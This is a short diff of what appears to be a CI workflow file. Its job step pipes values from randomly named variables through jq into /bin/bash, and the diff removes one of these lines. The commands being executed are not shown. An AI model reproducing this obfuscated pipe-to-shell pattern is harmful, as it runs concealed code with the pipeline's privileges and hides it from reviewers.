@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$pvok1" | jq -r .ioqec32 | /bin/bash
           printf '%s' "$rlhc165" | jq -r .mkhf60016 | /bin/bash
           printf '%s' "$fspe325" | jq -r .zoag1 | /bin/bash
-          printf '%s' "$zbker7580" | jq -r .gag9 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
